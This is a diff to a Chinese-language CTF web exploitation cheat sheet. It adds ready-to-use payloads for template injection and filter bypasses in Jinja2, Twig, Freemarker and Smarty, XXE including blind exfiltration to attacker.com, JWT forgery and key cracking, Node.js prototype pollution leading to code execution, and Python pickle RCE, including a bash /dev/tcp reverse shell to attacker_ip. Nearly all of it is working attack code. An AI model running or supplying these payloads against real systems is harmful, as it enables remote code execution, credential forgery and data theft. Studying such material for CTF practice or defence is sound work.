@@ -164,6 +164,70 @@ ${7*7}         → Java 模板引擎
 
 # 绕过过滤
 {{lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("cat /flag")|attr("read")()}}
+
+# 绕过 {{ }} 过滤 — 用 {% %}
+{% if ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read() %}1{% endif %}
+
+# 绕过 . 过滤 — 用 [] 或 |attr()
+{{''['__class__']['__mro__'][1]['__subclasses__']()}}
+
+# 绕过 _ 过滤 — 用 \x5f 或 request.args
+{{()|attr(request.args.a)|attr(request.args.b)}}  &a=__class__&b=__mro__
+
+# 绕过引号过滤 — 用 request 对象
+{{lipsum|attr(request.args.g)|attr(request.args.gi)(request.args.o)|attr(request.args.p)(request.args.c)|attr(request.args.r)()}}
+&g=__globals__&gi=__getitem__&o=os&p=popen&c=cat /flag&r=read
+```
+
+### Twig (PHP) RCE Payload
+
+```php
+// 检测
+{{7*7}}  → 49
+
+// 读文件
+{{'/flag'|file_excerpt(0,100)}}
+
+// 命令执行（Twig 1.x）
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
+
+// Twig 3.x（_self.env 不再可用）
+{{['cat /flag']|filter('system')}}
+{{['cat /flag']|map('system')}}
+{{['cat /flag']|sort('system')}}
+{{['cat /flag']|reduce('system')}}
+```
+
+### Freemarker (Java) RCE Payload
+
+```java
+// 检测
+${7*7}  → 49
+
+// 命令执行
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}
+
+// 读文件
+<#assign is=object?api.class.getResource("/flag").openStream()>
+<#assign reader=object?api.class.forName("java.io.InputStreamReader").getConstructor(object?api.class.forName("java.io.InputStream")).newInstance(is)>
+
+// ObjectConstructor
+<#assign oc=object?api.class.forName("freemarker.template.utility.ObjectConstructor")?new()>
+${oc("java.lang.ProcessBuilder", ["cat","/flag"]).start()}
+```
+
+### Smarty (PHP) RCE Payload
+
+```php
+// 检测
+{7*7}  → 49
+
+// 命令执行
+{system('cat /flag')}
+{if system('cat /flag')}{/if}
+
+// Smarty 3 沙箱绕过
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('cat /flag');?>",self::clearConfig())}
 ```
 
 ## 六、PHP 反序列化
@@ -213,7 +277,175 @@ http://127.1/flag
 http://[::1]/flag
 ```
 
-## 八、文件包含
+## 八、XXE（XML 外部实体注入）
+
+### 识别特征
+- 应用解析用户提交的 XML 数据
+- 使用 `simplexml_load_string()`、`DOMDocument`、`SAXParser` 等
+- 接口 Content-Type 为 `application/xml` 或 `text/xml`
+
+### 常用 Payload
+
+```xml
+<!-- 读取文件 -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///flag">
+]>
+<root><data>&xxe;</data></root>
+
+<!-- 读取 PHP 源码（base64 编码避免解析错误） -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
+]>
+<root><data>&xxe;</data></root>
+
+<!-- SSRF — 探测内网 -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://127.0.0.1:6379/info">
+]>
+<root><data>&xxe;</data></root>
+
+<!-- Blind XXE — 外带数据（OOB） -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///flag">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<root><data>&send;</data></root>
+
+<!-- attacker.com/evil.dtd 内容: -->
+<!-- <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>"> -->
+<!-- %all; -->
+```
+
+## 九、JWT 伪造
+
+### 识别特征
+- 应用使用 JWT（JSON Web Token）做身份认证
+- Cookie 或 Header 中有 `eyJ` 开头的 base64 字符串
+
+### 常用攻击方式
+
+```bash
+# 1. 算法置空攻击（alg: none）
+# 将 header 中的 alg 改为 "none"，删除签名部分
+# 适用于后端未严格校验算法的情况
+
+# 用 python 构造：
+import jwt
+token = jwt.encode({"user": "admin", "role": "admin"}, key="", algorithm="none")
+
+# 2. 密钥爆破（弱密钥）
+# 工具：jwt-cracker / hashcat
+hashcat -a 0 -m 16500 jwt.txt rockyou.txt
+
+# 3. RS256 → HS256 算法混淆
+# 如果服务端用 RS256（非对称），但也接受 HS256（对称）
+# 用公钥作为 HS256 的密钥来签名
+import jwt
+public_key = open('public.pem').read()
+token = jwt.encode({"user": "admin"}, public_key, algorithm="HS256")
+
+# 4. kid 注入
+# header 中的 kid 字段可能存在 SQL 注入或目录穿越
+# kid: "../../dev/null"  → 密钥为空
+# kid: "' union select 'secret' -- "  → 控制密钥值
+```
+
+### 工具
+```bash
+# jwt_tool — JWT 瑞士军刀
+python3 jwt_tool.py <token> -T    # 篡改 payload
+python3 jwt_tool.py <token> -C -d rockyou.txt  # 爆破密钥
+python3 jwt_tool.py <token> -X a  # alg:none 攻击
+python3 jwt_tool.py <token> -X k  # key confusion 攻击
+```
+
+## 十、Node.js 原型链污染
+
+### 识别特征
+- Node.js/Express 应用
+- 存在对象合并操作：`merge()`、`Object.assign()`、`lodash.merge()`、`_.defaultsDeep()`
+- 用户输入被递归合并到对象中
+
+### 攻击原理
+```javascript
+// 通过 __proto__ 污染 Object.prototype
+// 所有对象都会继承被污染的属性
+
+// 漏洞代码示例
+function merge(target, source) {
+    for (let key in source) {
+        if (typeof source[key] === 'object') {
+            if (!target[key]) target[key] = {};
+            merge(target[key], source[key]);
+        } else {
+            target[key] = source[key];
+        }
+    }
+}
+```
+
+### 常用 Payload
+```json
+// POST JSON 请求体
+{"__proto__": {"isAdmin": true}}
+{"constructor": {"prototype": {"isAdmin": true}}}
+
+// 配合 EJS 模板引擎 RCE
+{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('cat /flag');x"}}
+
+// 配合 Pug 模板引擎 RCE
+{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('cat /flag')"}}}
+
+// 配合 Handlebars RCE
+{"__proto__": {"allowProtoMethodsByDefault": true, "allowProtoPropertiesByDefault": true}}
+```
+
+## 十一、Python Pickle 反序列化
+
+### 识别特征
+- 代码中有 `pickle.loads()`、`pickle.load()`、`cPickle.loads()`
+- 用户输入被反序列化（通常是 base64 编码后传入）
+
+### RCE Payload
+```python
+import pickle
+import base64
+import os
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('cat /flag',))
+
+# 生成 payload
+payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+print(payload)
+
+# 反弹 shell 版本
+class ReverseShell(object):
+    def __reduce__(self):
+        return (os.system, ('bash -c "bash -i >& /dev/tcp/attacker_ip/9999 0>&1"',))
+
+# 如果 os 被过滤，用 subprocess
+class Bypass(object):
+    def __reduce__(self):
+        import subprocess
+        return (subprocess.check_output, (['cat', '/flag'],))
+
+# 如果 __reduce__ 被限制，用 __setstate__
+class Exploit2(object):
+    def __setstate__(self, state):
+        os.system(state)
+    def __getstate__(self):
+        return 'cat /flag'
+```
+
+## 十二、文件包含
 
 ### PHP 文件包含
 ```php
